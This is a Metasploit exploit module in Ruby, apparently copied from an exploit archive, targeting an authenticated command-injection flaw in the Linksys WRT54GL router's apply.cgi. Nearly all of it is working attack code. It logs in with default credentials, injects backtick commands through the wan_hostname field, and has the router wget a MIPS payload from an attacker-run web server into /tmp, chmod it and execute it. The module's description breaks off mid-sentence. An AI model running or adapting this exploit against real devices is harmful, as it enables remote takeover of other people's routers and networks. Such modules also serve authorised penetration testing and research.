 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;  => &#039;Linksys WRT54GL apply.cgi Command Execution&#039;,
      &#039;Description&#039; => %q{
          Some Linksys Routers are vulnerable to an authenticated OS command injection in
        the Web Interface. Default credentials are admin/admin or admin/password. Since it
        is a blind os command injection vulnerability, there is no output for the executed
        command when using the cmd generic payload. A ping command against a controlled
        system could be used for testing purposes. The user must be prudent when using this
        module since it modifies the router configuration while exploitation, even when it
      },
      &#039;Author&#039;      =>
        [
          &#039;Michael Messner <devnull@s3cur1ty.de>&#039;, # Vulnerability discovery and Metasploit module
          &#039;juan vazquez&#039; # minor help with msf module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;OSVDB&#039;, &#039;89912&#039; ],
          [ &#039;BID&#039;, &#039;57459&#039; ],
          [ &#039;EDB&#039;, &#039;24202&#039; ],
          [ &#039;URL&#039;, &#039;http://www.s3cur1ty.de/m1adv2013-001&#039; ]
        ],
      &#039;DisclosureDate&#039; => &#039;Jan 18 2013&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => [&#039;linux&#039;,&#039;unix&#039;],
      &#039;Payload&#039;  =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Targets&#039;  =>
        [
          [ &#039;CMD&#039;,
            {
            &#039;Arch&#039; => ARCH_CMD,
            &#039;Platform&#039; => &#039;unix&#039;
            }
          ],
          [ &#039;Linux mipsel Payload&#039;,
            {
            &#039;Arch&#039; => ARCH_MIPSLE,
            &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
        ],
      &#039;DefaultTarget&#039;  => 1,
      ))
 
    register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;The username to authenticate as&#039;, &#039;admin&#039; ]),
        OptString.new(&#039;PASSWORD&#039;, [ true, &#039;The password for the specified username&#039;, &#039;admin&#039; ]),
        OptAddress.new(&#039;DOWNHOST&#039;, [ false, &#039;An alternative host to request the MIPS payload from&#039; ]),
        OptString.new(&#039;DOWNFILE&#039;, [ false, &#039;Filename to download, (default: random)&#039; ]),
        OptInt.new(&#039;HTTP_DELAY&#039;, [true, &#039;Time that the HTTP Server will wait for the ELF payload request&#039;, 60]),
        OptBool.new(&#039;RESTORE_CONF&#039;, [ true, &#039;Should we try to restore the original configuration&#039;, true ])
      ], self.class)
  end
 
 
  def get_config(config, pattern)
    if config =~ /#{pattern}/
      return $1
    end
    return ""
  end
 
  def grab_config(user,pass)
    print_status("#{rhost}:#{rport} - Trying to download the original configuration")
    begin
      res = send_request_cgi({
        &#039;uri&#039;     => &#039;/index.asp&#039;,
        &#039;method&#039;  => &#039;GET&#039;,
        &#039;authorization&#039; => basic_auth(user,pass)
      })
      if res.nil? or res.code == 404
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
      end
      if [200, 301, 302].include?(res.code)
        if res.body =~ /lan_ipaddr_0/
          print_good("#{rhost}:#{rport} - Successful downloaded the configuration")
        else
          fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - Download of the original configuration not possible")
        end
      else
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
      end
    rescue ::Rex::ConnectionError
      fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport} - Failed to connect to the web server")
    end
 
    #now_proto and wan_proto should be the same and it should be dhcp! Nothing else tested!
    @now_proto_orig = get_config(res.body, "<input\ type=hidden\ name=now_proto\ value=\&#039;(.*)\&#039;>")
    if @now_proto_orig !~ /dhcp/
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Configuration not recognized, aborting to avoid breaking the device")
    end
    @wan_proto_orig = get_config(res.body, "var\ wan_proto\ =\ \&#039;(.*)\&#039;\;")
    if @wan_proto_orig !~ /dhcp/
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Configuration not recognized, aborting to avoid breaking the device")
    end
    @lan_proto_orig = get_config(res.body, "<input\ type=\"radio\"\ name=\"lan_proto\"\ value=\"(.*)\"\ checked\ onClick=\"SelDHCP")
    @daylight_time_orig = get_config(res.body, "<input\ type=hidden\ name=daylight_time\ value=(.*)>")
    @lan_ipaddr_orig = get_config(res.body, "<input\ type=hidden\ name=\"lan_ipaddr\"\ value=(.*)>")
    @wait_time_orig = get_config(res.body, "<input\ type=hidden\ name=\"wait_time\"\ value=(.*)>")
    @need_reboot_orig = get_config(res.body, "<input\ type=hidden\ name=\"need_reboot\"\ value=(.*)>")
    @lan_ipaddr_0_orig = get_config(res.body, "onBlur\=valid_range\\(this\,1\,223\,\"IP\"\\)\ size=3\ value=\&#039;(.*)\&#039;\ name=\"lan_ipaddr_0\"\>")
    @lan_ipaddr_1_orig = get_config(res.body, "\<INPUT\ class=num\ maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"IP\"\\)\ size=3\ value=\&#039;(.*)\&#039;\ name=\"lan_ipaddr_1\">")
    @lan_ipaddr_2_orig = get_config(res.body, "\<INPUT\ class=num maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"IP\"\\)\ size=3\ value=\&#039;(.*)\&#039;\ name=\"lan_ipaddr_2\">")
    @lan_ipaddr_3_orig = get_config(res.body, "<INPUT class=num maxLength=3\ onBlur=\"valid_range\\(this,1,254,&#039;IP&#039;\\)\;Sel_SubMask\\(this.form.lan_netmask,this.form\\);\"\ size=3" <<
      "\ value=&#039;(.*)&#039;\ name=\"lan_ipaddr_3\"><\/TD>")
    @router_name_orig = get_config(res.body, "name=\"router_name\"\ size=\"20\"\ value=\&#039;(.*)\&#039;\ onBlur=valid_name\\(this\,\"Router%20Name\"\\)><\/FONT><\/TD>")
    @wan_domain_orig = get_config(res.body, "name=\"wan_domain\"\ size=\"20\"\ value=\&#039;(.*)\&#039;\ onBlur=valid_name\\(this\,\"Domain%20name\"\,SPACE_NO\\)><\/FONT><\/TD>")
    @wan_hostname_orig = get_config(res.body, "<INPUT\ maxLength=39\ name=\"wan_hostname\"\ size=\"20\"\ value=\&#039;(.*)\&#039;\ onBlur=valid_name\\(this\,\"Host%20Name\"\\)><\/FONT><\/TD>")
    @wan_mtu_orig = get_config(res.body, "<INPUT\ class=num\ maxLength=4\ onBlur=valid_mtu\\(this\\)\ size=5\ value=&#039;(.*)&#039;\ name=\"wan_mtu\"><\/TD>")
    if @wan_mtu_orig.to_i > 1500
      @mtu_enable = "0"
    end
    @ui_language_orig = get_config(res.body, "<SCRIPT\ language=\"Javascript\"\ type=\"text\/javascript\" src=\"(.*)_lang_pack\/capsec.js\"><\/SCRIPT>")
    @dhcp_lease_orig = get_config(res.body, "<INPUT\ maxLength=4\ onBlur=valid_range\\(this\,0\,9999\,\"DHCP%20Lease%20Time\"\\)\ size=4\ value=\&#039;(.*)\&#039;\ name=\"dhcp_lease\"\ class=num")
    @dhcp_num_orig = get_config(res.body, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,1\,253\,\"Number%20of%20DHCP%20users\"\\)\;Sel_SubMask_onblur\\(this.form.lan_netmask\,this.form\\)" <<
      "\ size=3\ value=\&#039;(.*)\&#039;\ name=\"dhcp_num\"\ class=num><\/TD>")
    @dhcp_start_orig = get_config(res.body, "Sel_SubMask_onblur\\(this.form.lan_netmask\,this.form\\)\ size=3\ value=\&#039;(.*)\&#039;\ name=\"dhcp_start\"\ class=num\ " <<
      "onChange=\"valid_dhcpd_start_ip\\(this.form\,\ this\\)\">")
    @netmask_orig = get_config(res.body, "value=.*\ selected\>255\.255\.255\.(.*)\<\/OPTION\>")
    @wan_dns_orig = get_config(res.body, "<input\ type=hidden\ name=wan_dns\ value=(.*)><INPUT\ maxLength=3")
    @wan_dns0_0_orig = get_config(res.body, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,223\,\"DNS\"\\)\ size=3\ value=\&#039;(.*)\&#039;\ name=\"wan_dns0_0\"\ class=num\>")
    @wan_dns0_1_orig = get_config(res.body, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"DNS\"\\)\ size=3\ value=\&#039;(.*)\&#039; name=\"wan_dns0_1\"\ class=num\>")
    @wan_dns0_2_orig = get_config(res.body, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"DNS\"\\)\ size=3\ value=\&#039;(.*)\&#039;\ name=\"wan_dns0_2\"\ class=num\>")
    @wan_dns0_3_orig = get_config(res.body, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,254\,\"DNS\"\\)\ size=3\ value=\&#039;(.*)\&#039;\ name=\"wan_dns0_3\"\ class=num\>")
    @wan_dns1_0_orig = get_config(res.body, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,223\,\"DNS\"\\)\ size=3\ value=\&#039;(.*)\&#039;\ name=\"wan_dns1_0\"\ class=num\>")
    @wan_dns1_1_orig = get_config(res.body, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"DNS\"\\)\ size=3\ value=\&#039;(.*)\&#039; name=\"wan_dns1_1\"\ class=num\>")
    @wan_dns1_2_orig = get_config(res.body, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"DNS\"\\)\ size=3\ value=\&#039;(.*)\&#039;\ name=\"wan_dns1_2\"\ class=num\>")
    @wan_dns1_3_orig = get_config(res.body, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,254\,\"DNS\"\\)\ size=3\ value=\&#039;(.*)\&#039;\ name=\"wan_dns1_3\"\ class=num\>")
    @wan_dns2_0_orig = get_config(res.body, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,223\,\"DNS\"\\)\ size=3\ value=\&#039;(.*)\&#039;\ name=\"wan_dns2_0\"\ class=num\>")
    @wan_dns2_1_orig = get_config(res.body, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"DNS\"\\)\ size=3\ value=\&#039;(.*)\&#039; name=\"wan_dns2_1\"\ class=num\>")
    @wan_dns2_2_orig = get_config(res.body, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"DNS\"\\)\ size=3\ value=\&#039;(.*)\&#039;\ name=\"wan_dns2_2\"\ class=num\>")
    @wan_dns2_3_orig = get_config(res.body, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,254\,\"DNS\"\\)\ size=3\ value=\&#039;(.*)\&#039;\ name=\"wan_dns2_3\"\ class=num\>")
    @wan_wins_orig = get_config(res.body, "<input\ type=hidden\ name=wan_wins\ value=(.*)><INPUT\ maxLength=3")
    @wan_wins_0_orig = get_config(res.body, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,223\,\"WINS\"\\)\ size=3\ value=\&#039;(.*)\&#039;\ name=\"wan_wins_0\"\ class=num>")
    @wan_wins_1_orig = get_config(res.body, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"WINS\"\\)\ size=3\ value=\&#039;(.*)\&#039;\ name=\"wan_wins_1\"\ class=num>")
    @wan_wins_2_orig = get_config(res.body, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"WINS\"\\)\ size=3\ value=\&#039;(.*)\&#039;\ name=\"wan_wins_2\"\ class=num>")
    @wan_wins_3_orig = get_config(res.body, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,254\,\"WINS\"\\)\ size=3\ value=\&#039;(.*)\&#039;\ name=\"wan_wins_3\"\ class=num>")
  end
 
  def restore_conf(user,pass,uri)
    # we have used most parts of the original configuration
    # just need to restore wan_hostname
    cmd = @wan_hostname_orig.to_s
    print_status("#{rhost}:#{rport} - Asking the Linksys device to reload original configuration")
 
    res = request(cmd,user,pass,uri)
 
    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to reload original configuration")
    end
 
    #the device needs around 10 seconds to apply our current configuration
    print_status("#{rhost}:#{rport} - Waiting #{@timeout} seconds for reloading the configuration")
    select(nil, nil, nil, @timeout)
  end
 
  def request(cmd,user,pass,uri)
    begin
      res = send_request_cgi({
        &#039;uri&#039;    => uri,
        &#039;method&#039; => &#039;POST&#039;,
        &#039;authorization&#039; => basic_auth(user,pass),
        &#039;encode_params&#039; => false,
        &#039;vars_post&#039; => {
          &#039;submit_button&#039; => "index",
          &#039;change_action&#039; => "1",
          &#039;submit_type&#039; => "1",
          &#039;action&#039; => "Apply",
          &#039;now_proto&#039; => @now_proto_orig.to_s,
          &#039;daylight_time&#039; => @daylight_time_orig.to_s,
          &#039;lan_ipaddr&#039; => @lan_ipaddr_orig.to_s,
          &#039;wait_time&#039; => @wait_time_orig.to_s,
          &#039;need_reboot&#039; => @need_reboot_orig.to_s,
          &#039;ui_language&#039; => @ui_language_orig,
          &#039;wan_proto&#039; => @wan_proto_orig.to_s,
          &#039;router_name&#039; => @router_name_orig.to_s,
          &#039;wan_hostname&#039; => cmd,
          &#039;wan_domain&#039; => @wan_domain_orig.to_s,
          &#039;mtu_enable&#039; => @mtu_enable.to_s,
          &#039;wan_mtu&#039; => @wan_mtu_orig.to_s,
          &#039;lan_ipaddr_0&#039; => @lan_ipaddr_0_orig.to_s,
          &#039;lan_ipaddr_1&#039; => @lan_ipaddr_1_orig.to_s,
          &#039;lan_ipaddr_2&#039; => @lan_ipaddr_2_orig.to_s,
          &#039;lan_ipaddr_3&#039; => @lan_ipaddr_3_orig.to_s,
          &#039;lan_netmask&#039; => "255.255.255.#{@netmask_orig}",
          &#039;lan_proto&#039; => @lan_proto_orig.to_s,
          &#039;dhcp_check&#039; => "1",
          &#039;dhcp_start&#039; => @dhcp_start_orig.to_s,
          &#039;dhcp_num&#039; => @dhcp_num_orig.to_s,
          &#039;dhcp_lease&#039; => @dhcp_lease_orig.to_s,
          &#039;wan_dns&#039; => @wan_dns_orig.to_s,
          &#039;wan_dns0_0&#039; => @wan_dns0_0_orig.to_s,
          &#039;wan_dns0_1&#039; => @wan_dns0_1_orig.to_s,
          &#039;wan_dns0_2&#039; => @wan_dns0_2_orig.to_s,
          &#039;wan_dns0_3&#039; => @wan_dns0_3_orig.to_s,
          &#039;wan_dns1_0&#039; => @wan_dns1_0_orig.to_s,
          &#039;wan_dns1_1&#039; => @wan_dns1_1_orig.to_s,
          &#039;wan_dns1_2&#039; => @wan_dns1_2_orig.to_s,
          &#039;wan_dns1_3&#039; => @wan_dns1_3_orig.to_s,
          &#039;wan_dns2_0&#039; => @wan_dns2_0_orig.to_s,
          &#039;wan_dns2_1&#039; => @wan_dns2_1_orig.to_s,
          &#039;wan_dns2_2&#039; => @wan_dns2_2_orig.to_s,
          &#039;wan_dns2_3&#039; => @wan_dns2_3_orig.to_s,
          &#039;wan_wins&#039; => @wan_wins_orig.to_s,
          &#039;wan_wins_0&#039; => @wan_wins_0_orig.to_s,
          &#039;wan_wins_1&#039; => @wan_wins_1_orig.to_s,
          &#039;wan_wins_2&#039; => @wan_wins_2_orig.to_s,
          &#039;wan_wins_3&#039; => @wan_wins_3_orig.to_s,
          &#039;time_zone&#039; => "-08+1+1",    #default is ok
          &#039;_daylight_time&#039; => &#039;1&#039;      #default is ok
          }
        })
      return res
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost} - Failed to connect to the web server")
      return nil
    end
 
  end
 
  def exploit
    downfile = datastore[&#039;DOWNFILE&#039;] || rand_text_alpha(8+rand(8))
    uri = &#039;/apply.cgi&#039;
    user = datastore[&#039;USERNAME&#039;]
    pass = datastore[&#039;PASSWORD&#039;]
    rhost = datastore[&#039;RHOST&#039;]
    rport = datastore[&#039;RPORT&#039;]
    restore = datastore[&#039;RESTORE_CONF&#039;]
    @timeout = 10
 
    #
    # testing Login
    #
    print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")
    begin
      res = send_request_cgi({
        &#039;uri&#039;     => uri,
        &#039;method&#039;  => &#039;GET&#039;,
        &#039;authorization&#039; => basic_auth(user,pass)
      })
      if res.nil? or res.code == 404
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
      end
      if [200, 301, 302].include?(res.code)
        print_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
      else
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
      end
    rescue ::Rex::ConnectionError
      fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport} - Failed to connect to the web server")
    end
 
 
    grab_config(user,pass)
 
    if target.name =~ /CMD/
      if not (datastore[&#039;CMD&#039;])
        fail_with(Exploit::Failure::BadConfig, "#{rhost}:#{rport} - Only the cmd/generic payload is compatible")
      end
      cmd = payload.encoded
      cmd = "`#{cmd}`"
      res = request(cmd,user,pass,uri)
      if (!res)
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
      else
        print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")
      end
      print_status("#{rhost}:#{rport} - Waiting #{@timeout} seconds for reloading the configuration")
      select(nil, nil, nil, @timeout)
      restore_conf(user,pass,uri) if restore
      return
    end
 
    #thx to Juan for his awesome work on the mipsel elf support
    @pl = generate_payload_exe
    @elf_sent = false
 
    #
    # start our server
    #
    resource_uri = &#039;/&#039; + downfile
 
    if (datastore[&#039;DOWNHOST&#039;])
      service_url = &#039;http://&#039; + datastore[&#039;DOWNHOST&#039;] + &#039;:&#039; + datastore[&#039;SRVPORT&#039;].to_s + resource_uri
    else
      #do not use SSL
      if datastore[&#039;SSL&#039;]
        ssl_restore = true
        datastore[&#039;SSL&#039;] = false
      end
 
      #we use SRVHOST as download IP for the coming wget command.
      #SRVHOST needs a real IP address of our download host
      if (datastore[&#039;SRVHOST&#039;] == "0.0.0.0" or datastore[&#039;SRVHOST&#039;] == "::")
        srv_host = Rex::Socket.source_address(rhost)
      else
        srv_host = datastore[&#039;SRVHOST&#039;]
      end
 
      service_url = &#039;http://&#039; + srv_host + &#039;:&#039; + datastore[&#039;SRVPORT&#039;].to_s + resource_uri
      print_status("#{rhost}:#{rport} - Starting up our web service on #{service_url} ...")
      start_service({&#039;Uri&#039; => {
        &#039;Proc&#039; => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
        &#039;Path&#039; => resource_uri
      }})
 
      datastore[&#039;SSL&#039;] = true if ssl_restore
    end
 
    #
    # download payload
    #
    print_status("#{rhost}:#{rport} - Asking the Linksys device to download #{service_url}")
    #this filename is used to store the payload on the device
    filename = rand_text_alpha_lower(8)
 
    #not working if we send all command together -> lets take three requests
    cmd = "/usr/bin/wget #{service_url} -O /tmp/#{filename}"
    cmd = "`#{cmd}`"
    res = request(cmd,user,pass,uri)
    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end
 
    # wait for payload download
    if (datastore[&#039;DOWNHOST&#039;])
      #waiting some time so we could be sure that the device got the payload from our third party server
      print_status("#{rhost}:#{rport} - Giving #{datastore[&#039;HTTP_DELAY&#039;]} seconds to the Linksys device to download the payload")
      select(nil, nil, nil, datastore[&#039;HTTP_DELAY&#039;])
    else
      wait_linux_payload
    end
    register_file_for_cleanup("/tmp/#{filename}")
 
    #
    # chmod
    #
    cmd = "chmod 777 /tmp/#{filename}"
    cmd = "`#{cmd}`"
    print_status("#{rhost}:#{rport} - Asking the Linksys device to chmod #{downfile}")
    res = request(cmd,user,pass,uri)
    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end
    print_status("#{rhost}:#{rport} - Waiting #{@timeout} seconds for reloading the configuration")
    select(nil, nil, nil, @timeout)
 
    #
    # execute
    #
    cmd = "/tmp/#{filename}"
    cmd = "`#{cmd}`"
    print_status("#{rhost}:#{rport} - Asking the Linksys device to execute #{downfile}")
    res = request(cmd,user,pass,uri)
    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end
    print_status("#{rhost}:#{rport} - Waiting #{@timeout} seconds for reloading the configuration")
    select(nil, nil, nil, @timeout)
 
    #
    #reload original configuration
    #
    if restore
      restore_conf(user,pass,uri)
    end
  end
 
  # Handle incoming requests from the server
  def on_request_uri(cli, request)
    #print_status("on_request_uri called: #{request.inspect}")
    if (not @pl)
      print_error("#{rhost}:#{rport} - A request came in, but the payload wasn&#039;t ready yet!")
      return
    end
    print_status("#{rhost}:#{rport} - Sending the payload to the server...")
    @elf_sent = true
    send_response(cli, @pl)
  end
 
  # wait for the data to be sent
  def wait_linux_payload
    print_status("#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...")
 
    waited = 0
    while (not @elf_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore[&#039;HTTP_DELAY&#039;])
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Target didn&#039;t request request the ELF payload -- Maybe it cant connect back to us?")
      end
    end
  end
 
end

